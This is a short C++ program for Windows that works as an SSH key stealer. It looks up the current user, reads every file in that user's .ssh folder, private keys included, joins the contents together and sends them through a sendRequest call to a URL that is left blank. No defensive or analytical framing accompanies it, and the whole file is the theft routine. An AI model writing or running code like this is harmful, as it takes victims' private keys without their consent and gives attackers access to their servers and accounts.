#include <string>
#include <iostream>
#include <filesystem>
#include <fstream>
#include <vector>
#include <windows.h>
#include <Lmcons.h>
#include <sstream>
#include "sendRequest.h"

namespace fs = std::filesystem;

int main()
{
	std::string message;
	std::string url = "";

	// Get Username of Windows User
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserNameA(username, &username_len);
	std::string user = username;

	std::string path = "C:\\Users\\" + user + "\\.ssh";
	int stringLength = std::string("id_ed25519").length();
	std::string currentOutput;
	int stringEnding;
	for (const auto& entry : fs::recursive_directory_iterator(path))
	{
		currentOutput = entry.path().string();
		stringEnding = currentOutput.length();

		message += currentOutput + "\n";
		std::ifstream myfile;
		myfile.open(currentOutput);
		std::string mystring;
		if (myfile.is_open())
		{
			while (std::getline(myfile, mystring))
			{	
				message += mystring.c_str() + std::string("\n");
			}
		}
	}
	sendRequest(url, message);
}